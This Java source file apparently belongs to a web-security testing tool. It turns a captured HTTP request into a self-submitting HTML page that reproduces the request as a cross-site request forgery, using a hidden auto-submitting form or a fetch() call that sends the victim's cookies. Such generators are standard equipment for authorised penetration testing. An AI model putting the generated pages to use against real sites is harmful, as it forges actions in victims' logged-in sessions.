package opentrap.csrf;

import opentrap.core.HttpMessage;
import opentrap.core.HttpService;
import opentrap.core.Param;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Locale;

/**
 * Builds a self-submitting HTML proof-of-concept that reproduces a request as a
 * cross-site request. Form-urlencoded and multipart bodies become an auto-
 * submitting form; other bodies (JSON, etc.) become a fetch() call.
 */
public final class CsrfPoc {

    private CsrfPoc() {}

    public static String generate(HttpService svc, HttpMessage req) {
        String method = req.method().isEmpty() ? "GET" : req.method().toUpperCase(Locale.ROOT);
        String action = svc.url() + req.path();
        String ct = req.contentType();

        if (method.equals("GET")) return formPoc(action, "GET", req, Param.Type.URL, false);
        if (ct.contains("x-www-form-urlencoded")) return formPoc(action, "POST", req, Param.Type.BODY, false);
        if (ct.contains("multipart/")) return formPoc(action, "POST", req, Param.Type.MULTIPART, true);
        return fetchPoc(action, method, ct, req.bodyText());
    }

    private static String formPoc(String action, String method, HttpMessage req, Param.Type type, boolean multipart) {
        StringBuilder inputs = new StringBuilder();
        for (Param p : req.parameters()) {
            if (p.type() != type) continue;
            String name = esc(multipart ? p.name() : urlDecode(p.name()));
            String value = esc(multipart ? p.value() : urlDecode(p.value()));
            inputs.append("    <input type=\"hidden\" name=\"").append(name)
                  .append("\" value=\"").append(value).append("\">\n");
        }
        String enctype = multipart ? " enctype=\"multipart/form-data\"" : "";
        return "<!doctype html>\n<html>\n<body onload=\"document.forms[0].submit()\">\n"
                + "  <form action=\"" + esc(action) + "\" method=\"" + method + "\"" + enctype + ">\n"
                + inputs
                + "    <input type=\"submit\" value=\"submit\">\n"
                + "  </form>\n</body>\n</html>\n";
    }

    private static String fetchPoc(String action, String method, String ct, String body) {
        if (ct == null || ct.isEmpty()) ct = "text/plain";
        return "<!doctype html>\n<html>\n<body>\n<script>\n"
                + "fetch(" + js(action) + ", {\n"
                + "  method: " + js(method) + ",\n"
                + "  mode: 'no-cors',\n"
                + "  credentials: 'include',\n"
                + "  headers: { 'Content-Type': " + js(ct) + " },\n"
                + "  body: " + js(body) + "\n"
                + "});\n</script>\n</body>\n</html>\n";
    }

    // ---- helpers ----

    static String urlDecode(String s) {
        if (s == null) return "";
        ByteArrayOutputStream out = new ByteArrayOutputStream(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '+') out.write(' ');
            else if (c == '%' && i + 2 < s.length()) {
                int hi = hex(s.charAt(i + 1)), lo = hex(s.charAt(i + 2));
                if (hi >= 0 && lo >= 0) { out.write((hi << 4) | lo); i += 2; }
                else out.write(c);
            } else out.write(c);
        }
        return new String(out.toByteArray(), StandardCharsets.ISO_8859_1);
    }

    private static int hex(char c) {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return -1;
    }

    static String esc(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }

    private static String js(String s) {
        if (s == null) s = "";
        StringBuilder b = new StringBuilder("'");
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\'' -> b.append("\\'");
                case '\\' -> b.append("\\\\");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '<'  -> b.append("\\x3c");
                default   -> b.append(c);
            }
        }
        return b.append('\'').toString();
    }
}
